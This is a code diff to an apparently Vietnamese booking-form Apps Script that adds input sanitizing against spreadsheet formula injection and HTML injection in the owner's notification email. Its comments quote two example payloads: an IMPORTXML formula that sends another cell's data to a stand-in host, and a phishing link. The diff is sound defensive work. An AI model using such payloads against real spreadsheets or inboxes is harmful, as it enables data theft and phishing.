@@ -83,6 +83,43 @@ function thietLapBanDau() {
   console.log('Da thiet lap xong tab "' + SHEET_NAME + '". Gio bam Trien khai de lay link.');
 }
 
+/**
+ * ------------------------------------------------------------
+ *  HAI HÀM AN TOÀN — đừng xoá
+ * ------------------------------------------------------------
+ */
+
+/**
+ * Chặn "formula injection".
+ * Nếu khách điền tên là =IMPORTXML("https://evil.co/?x="&C2,"//a") thì Google Sheets
+ * sẽ CHẠY công thức đó khi chủ tiệm mở bảng, và gửi dữ liệu khách khác ra ngoài.
+ * Chèn dấu nháy đơn phía trước để Sheets hiểu đây là văn bản, không phải công thức.
+ * Dấu nháy này không hiển thị trong ô nên không ảnh hưởng việc đọc.
+ */
+function oAnToan(giaTri) {
+  const s = String(giaTri == null ? '' : giaTri);
+  if (s === '') return '';
+  // Bốn ký tự mở đầu mà Sheets/Excel coi là công thức
+  if (/^[=+\-@]/.test(s)) return "'" + s;
+  // Tab và xuống dòng đầu chuỗi cũng kích hoạt công thức trong Excel
+  if (/^[\t\r\n]/.test(s)) return "'" + s;
+  return s;
+}
+
+/**
+ * Chặn HTML injection vào email báo về.
+ * Không có hàm này thì khách điền tên là <a href="https://lua-dao.co">Bấm đây</a>
+ * sẽ chèn được link lừa đảo vào chính email chủ tiệm đọc.
+ */
+function chuAnToan(giaTri) {
+  return String(giaTri == null ? '' : giaTri)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
 /** Website gọi vào đây mỗi khi có khách gửi form. */
 function doPost(e) {
   try {
@@ -102,13 +139,13 @@ function doPost(e) {
 
     sheet.appendRow([
       now,
-      d.name || '',
-      "'" + (d.phone || ''),   // dấu ' giữ nguyên số 0 đầu
-      d.service || '',
-      d.address || '',
-      d.note || '',
-      d.source || 'truc-tiep',
-      d.device || '',
+      oAnToan(d.name),
+      "'" + String(d.phone || ''),   // dấu ' giữ nguyên số 0 đầu
+      oAnToan(d.service),
+      oAnToan(d.address),
+      oAnToan(d.note),
+      oAnToan(d.source || 'truc-tiep'),
+      oAnToan(d.device),
       'Mới',
       '',
     ]);
@@ -127,21 +164,22 @@ function doGet() {
 
 function guiEmail(d, now) {
   try {
-    const phone = String(d.phone || '');
+    // Số điện thoại dùng trong href="tel:" nên phải lọc, chỉ giữ chữ số và dấu +
+    const phone = String(d.phone || '').replace(/[^0-9+]/g, '');
     MailApp.sendEmail({
       to: NOTIFY_EMAIL,
-      subject: '🔔 Yêu cầu mới: ' + (d.service || 'Chưa rõ') + ' — ' + phone,
+      subject: '🔔 Yêu cầu mới: ' + String(d.service || 'Chưa rõ').replace(/[\r\n]/g, ' ') + ' — ' + phone,
       htmlBody:
         '<div style="font-family:Arial,sans-serif;max-width:520px">' +
         '<h2 style="color:#0E2352;margin:0 0 4px">Yêu cầu đặt lịch mới</h2>' +
-        '<p style="color:#64748B;margin:0 0 16px;font-size:13px">' + now + '</p>' +
+        '<p style="color:#64748B;margin:0 0 16px;font-size:13px">' + chuAnToan(now) + '</p>' +
         '<table cellpadding="8" style="border-collapse:collapse;width:100%;font-size:14px">' +
-        hang('Khách hàng', d.name) +
+        hang('Khách hàng', chuAnToan(d.name)) +
         hang('Số điện thoại', '<a href="tel:' + phone + '" style="color:#195A9E;font-weight:bold;font-size:17px">' + phone + '</a>') +
-        hang('Dịch vụ', d.service) +
-        hang('Địa chỉ', d.address) +
-        hang('Tình trạng', d.note || '(không ghi)') +
-        hang('Nguồn', d.source || 'truc-tiep') +
+        hang('Dịch vụ', chuAnToan(d.service)) +
+        hang('Địa chỉ', chuAnToan(d.address)) +
+        hang('Tình trạng', chuAnToan(d.note) || '(không ghi)') +
+        hang('Nguồn', chuAnToan(d.source || 'truc-tiep')) +
         '</table>' +
         '<p style="margin-top:18px"><a href="' + SpreadsheetApp.getActiveSpreadsheet().getUrl() +
         '" style="background:#06B6D4;color:#04283A;padding:11px 20px;border-radius:8px;' +
